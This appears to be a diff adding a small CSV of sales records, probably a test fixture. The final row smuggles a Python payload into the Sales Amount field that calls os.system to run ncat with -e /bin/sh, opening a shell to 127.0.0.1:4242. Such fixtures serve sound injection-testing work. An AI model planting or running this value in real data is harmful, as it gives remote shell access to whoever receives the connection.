@@ -1,0 +1,10 @@
+Date,Product,Quantity,Sales Amount
+2024-01-01,Widget A,3,90
+2024-01-01,Gadget B,2,150
+2024-01-02,Widget A,1,30
+2024-01-02,Tool C,5,250
+2024-01-03,Gadget B,1,75
+2024-01-03,Widget A,2,60
+2024-01-04,Tool C,3,150
+2024-01-05,Gadget B,2,150
+2024-11-11,Foo,10,<<__import__('os').system('ncat 127.0.0.1 4242 -e /bin/sh')>>
